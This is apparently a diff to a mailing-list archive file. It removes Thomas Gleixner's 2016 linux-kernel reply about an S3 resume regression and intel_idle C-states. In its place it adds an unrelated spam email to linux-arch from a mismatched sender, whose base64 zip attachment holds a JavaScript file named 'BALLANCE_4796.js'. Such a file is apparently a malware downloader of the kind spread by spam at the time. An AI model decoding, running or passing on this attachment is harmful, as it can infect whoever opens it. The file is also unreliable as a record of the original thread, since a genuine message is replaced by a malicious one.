@@ -1,57 +1,108 @@
-From: Thomas Gleixner <tglx@linutronix.de>
-Subject: Re: S3 resume regression [1cf4f629d9d2 ("cpu/hotplug: Move online
- calls to hotplugged cpu")]
-Date: Thu, 27 Oct 2016 22:41:18 +0200 (CEST)
-Message-ID: <alpine.DEB.2.20.1610272238390.4913@nanos>
-References: <20160526183207.GX4329@intel.com> <CAJZ5v0in8YwMBgLd6=KgGVc-f2yVvutOJG_u05OKLK7_EzN0yQ@mail.gmail.com> <20160531072650.GP4329@intel.com> <20160713145425.GB4329@intel.com> <CA++bM2sLMDLdeyLd_gpknTj+Y5xMk261SvivU5YxTnL0jRZovA@mail.gmail.com>
- <20160809172057.GZ4329@intel.com> <20161027172852.GE4617@intel.com> <alpine.DEB.2.20.1610272035180.4913@nanos> <20161027192006.GF4617@intel.com> <alpine.DEB.2.20.1610272122510.4913@nanos> <20161027203745.GH4617@intel.com>
+From: <municlerk@cityofjarrell.com>
+Subject: 86832127018380 linux-arch
+Date: Thu, 27 Oct 2016 22:22:25 -0000
+Message-ID: <147760694565.26039.17903543885343548153@frontiernet.net>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; BOUNDARY="8323329-18361705-1477600880=:4913"
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20161027203745.GH4617@intel.com>
-Sender: linux-kernel-owner@vger.kernel.org
-To: =?ISO-8859-15?Q?Ville_Syrj=E4l=E4?= <ville.syrjala@linux.intel.com>
-Cc: Feng Tang <feng.79.tang@gmail.com>, feng.tang@intel.com, "Rafael J. Wysocki" <rafael@kernel.org>, "Rafael J. Wysocki" <rafael.j.wysocki@intel.com>, Steven Rostedt <rostedt@goodmis.org>, Sebastian Andrzej Siewior <bigeasy@linutronix.de>, linux-arch@vger.kernel.org, Rik van Riel <riel@redhat.com>, "Srivatsa S. Bhat" <srivatsa@mit.edu>, Peter Zijlstra <peterz@infradead.org>, Arjan van de Ven <arjan@linux.intel.com>, Rusty Russell <rusty@rustcorp.com.au>, Oleg Nesterov <oleg@redhat.com>, Tejun Heo <tj@kernel.org>, Andrew Morton <akpm@linux-foundation.org>, Paul McKenney <paulmck@linux.vnet.ibm.com>, Linus Torvalds <torvalds@linux-foundation.org>, Paul Turner <pjt@google.com>, Linux Kernel Mailing List <linux-kernel@vger.kernel.org>, "Zhang, Rui" <rui.zhang@intel>
-List-Id: linux-arch.vger.kernel.org
+Content-Type: application/zip; name="pelinux-arch.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-arch-owner@vger.kernel.org>
+Received: from static-173-55-99-146.lsanca.fios.frontiernet.net ([173.55.99.146]:2501
+        "HELO frontiernet.net" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S942525AbcJ0WWa (ORCPT
+        <rfc822;linux-arch@vger.kernel.org>); Thu, 27 Oct 2016 18:22:30 -0400
+Content-Disposition: attachment
+Sender: linux-arch-owner@vger.kernel.org
+List-ID: <linux-arch.vger.kernel.org>
+To: linux-arch@vger.kernel.org
 
-  This message is in MIME format.  The first part should be readable text,
-  while the remaining parts are likely unreadable without MIME-aware tools.
-
---8323329-18361705-1477600880=:4913
-Content-Type: text/plain; charset=iso-8859-1
-Content-Transfer-Encoding: 8BIT
-
-On Thu, 27 Oct 2016, Ville Syrjälä wrote:
-> On Thu, Oct 27, 2016 at 09:25:05PM +0200, Thomas Gleixner wrote:
-> > So it would be interesting whether that hunk in resume_broadcast() is
-> > sufficient.
-> 
-> So far it looks like the answer is yes.
-> 
-> Looks to be about 5 seconds slower than acpi-idle in resuming, but
-> I suppose that's not all that surprising ;)
-
-Well, set it to 1msec then. If that works reliably then we really can do
-that unconditionally. There is no harm in firing a useless timer during
-resume once.
-
-> > Does the machine work, when you limit intel idle to C3, which would then
-> > match acpi idle ?
-> 
-> I'm pretty sure I had tested all of these, but I just double checked
-> to make sure. There's no C3 with intel_idle so I limited to C2, but
-> that did not help.
-> 
-> Isn't it possible that ACPI C3 is in fact C4? I thought ACPI C-states
-> are always numbered non-sparsely, and in this case ACPI C3 could be
-> anything from C3 to C11 (if the processor actually supported such
-> states obviously). Actually now that I look at the descriptions for
-> the states in sysfs, it says "MWAIT 0x30" for state3 on both drivers,
-> which I presume means it's in fact C4 for both.
-
-Indeed.
-
-Thanks,
-
-	tglx
---8323329-18361705-1477600880=:4913--
+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
